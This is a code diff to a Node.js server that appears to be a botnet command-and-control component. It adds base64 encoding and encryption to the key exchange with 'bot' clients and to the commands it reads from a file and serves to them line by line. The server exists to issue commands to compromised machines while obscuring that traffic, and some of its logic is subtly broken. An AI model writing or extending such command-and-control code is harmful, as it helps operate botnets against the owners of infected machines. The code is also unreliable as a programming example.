@@ -91,6 +91,14 @@ Connection = function(bot_client_partial_key) {
 
 }
 
+function encode(str){
+	return new Buffer(str+'').toString('base64');
+}
+
+function decode(str64){
+	return new Buffer(str64, 'base64').toString('ascii');
+}
+
 function generateConnectionId(){
 	var INT_MAX = 2147483647;
 	var r = Math.floor(Math.random() * 9) // 0 <= r <= 9
@@ -111,13 +119,13 @@ function generateConnectionId(){
 
 function first_connection (bot_client_partial_key, confirm_value, response){
 	connection = new Connection (bot_client_partial_key);
-	response.write("id:"+connection.id+"\n");
-	response.write("k_s:"+connection.bot_master_partial_key +"\n");
+	response.write(encode(connection.id) + "\n");
+	response.write(encode(connection.bot_master_partial_key) + "\n");
 	var confirmation = confirm_value ^ connection.private_key;
 //	response.write("confirm:"+confirmation+"\n");
 //	response.write("<h6>PRIVATE KEY "+connection.private_key+"</h6>");
 //	response.write("<h6>EXPANDED PRIVATE KEY "+connection.expanded_private_key+"</h6>");
-	response.write("confirm:"+connection.encrypt(confirm_value));
+	response.write(encode(connection.encrypt(confirm_value)));
 
 	connections[connection.id] = connection; // save this connection into the hash of connections
 }
@@ -146,21 +154,32 @@ var server = http.createServer(function (request, response){
 			response.write("<h4> Try send<br/>id<br/>or<br/>k_c and confirm </h4>");
 			response.end();
 		}
-	}else{		
+	}else{
 		connection = find_connection(params['id']);
 		if (connection == null){
-			response.write("id:" + params['id']);
+			response.write(encode("conn_not_found:" + params['id']));
 			response.end();
 		}else{
-			response.write("id:" + connection.id + "\n");
+			response.write(encode(connection.encrypt("id:" + connection.id)) + "\n");
 			// Read the file with the commands and send these commands to the client.
+			var lineReader = require('line-reader');
+			lineReader.open(FILE, function(reader) {
+				if (reader.hasNextLine()) {
+			    	reader.nextLine(function(line) {
+						response.write(encode(connection.encrypt(line)) + "\n");
+					});
+				}else{
+					response.end();
+				}
+			});
+			/*
 			fs.readFile(FILE, 'utf8', function (err,data) {
 				if (err) {
     				return console.log(err);
 				}
-				response.write("'" + connection.encrypt(data) + "'");
-				response.end();
+				response.write(encode(connection.encrypt(data)));
 			});
+			*/
 		}
 	}
 });
